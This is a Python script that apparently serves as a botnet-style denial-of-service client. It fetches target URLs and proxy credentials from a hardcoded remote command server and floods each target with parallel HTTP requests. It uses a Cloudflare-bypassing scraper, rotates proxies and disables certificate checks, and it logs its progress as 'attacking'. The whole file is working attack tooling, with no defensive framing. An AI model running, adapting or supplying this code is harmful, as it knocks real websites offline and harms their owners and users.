import asyncio
import json
import random
from sys import stderr

import requests
from aiocfscrape import CloudflareScraper
from aiohttp import ClientTimeout
from loguru import logger
from urllib3 import disable_warnings

HOSTS = ['http://46.4.63.238/api.php']
TIMEOUT = ClientTimeout(
    total=20,
    connect=10,
    sock_read=10,
    sock_connect=10,
)
CUSTOM_PROXY = None  # can be like 'http://login:username@1.2.3.4:5678' OR 'http://1.2.3.4:5678'
REQUESTS_PER_SITE = 50
PARALLEL_COUNT = 20
SHOW_REQUEST_EXCEPTIONS = False


def main():
    loop = asyncio.get_event_loop()
    union = asyncio.gather(*[
        start_one()
        for _ in range(PARALLEL_COUNT)
    ])
    loop.run_until_complete(union)


async def start_one():
    while True:
        host = random.choice(HOSTS)
        content = requests.get(host).content
        if not content:
            await start_one()
        data = json.loads(content)
        url = data['site']['url']
        proxies = data['proxy']
        async with CloudflareScraper(timeout=TIMEOUT) as session:
            success = await attempt(session, url)
            if not success:
                if CUSTOM_PROXY:
                    await attempt(session, url, CUSTOM_PROXY)
                else:
                    for proxy_data in proxies:
                        proxy = f'http://{proxy_data["auth"]}@{proxy_data["ip"]}'
                        success = await attempt(session, url, proxy)
                        if success:
                            break


async def attempt(session: CloudflareScraper, url: str, proxy: str = None) -> bool:
    logger.info(f'\t\tTrying to attack {url} with proxy {proxy}')
    status_code = await request(session, url, proxy)
    if 200 <= status_code < 300:
        logger.info(f'START ATTACKING {url} USING PROXY {proxy}')
        for i in range(REQUESTS_PER_SITE):
            await request(session, url, proxy)
        logger.info(f'ATTACKING {url} IS DONE')
        return True
    return False


async def request(session: CloudflareScraper, url: str, proxy: str = None) -> int:
    try:
        async with session.get(url, proxy=proxy, verify_ssl=False) as response:
            return response.status
    except Exception as e:
        if SHOW_REQUEST_EXCEPTIONS:
            logger.warning(f'Exception on request, exception={e}, url={url}, proxy={proxy}')
        return -1


if __name__ == '__main__':
    logger.remove()
    logger.add(
        stderr,
        format='<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>'
    )
    disable_warnings()
    main()
